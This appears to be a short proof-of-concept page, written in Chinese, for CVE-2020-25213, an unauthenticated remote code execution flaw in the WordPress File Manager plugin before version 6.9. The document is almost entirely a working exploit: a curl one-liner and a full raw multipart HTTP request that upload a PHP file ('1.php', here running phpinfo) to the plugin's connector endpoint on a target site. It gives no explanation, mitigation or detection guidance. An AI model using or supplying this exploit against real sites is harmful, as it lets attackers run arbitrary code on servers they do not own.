# WordPress File Manager＜6.9 RCE CVE-2020-25213

## 漏洞复现

poc：

```
curl -ks --max-time 5 -F "reqid=17457a1fe6959" -F "cmd=upload" -F "target=l1_Lw"  -F "mtime[]=1576045135" -F "upload[]=@/$file_upload" "hxxps://victim.com/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
```

```
POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1
Content-Length: 631
Content-Type: multipart/form-data; boundary=------------------------9689147a5989a801
Connection: close

--------------------------9689147a5989a801
Content-Disposition: form-data; name="reqid"

17457a1fe6959
--------------------------9689147a5989a801
Content-Disposition: form-data; name="cmd"

upload
--------------------------9689147a5989a801
Content-Disposition: form-data; name="target"

l1_Lw
--------------------------9689147a5989a801
Content-Disposition: form-data; name="mtime[]"

1576045135
--------------------------9689147a5989a801
Content-Disposition: form-data; name="upload[]"; filename="1.php"
Content-Type: application/octet-stream

<?php phpinfo();?>

--------------------------9689147a5989a801--
```

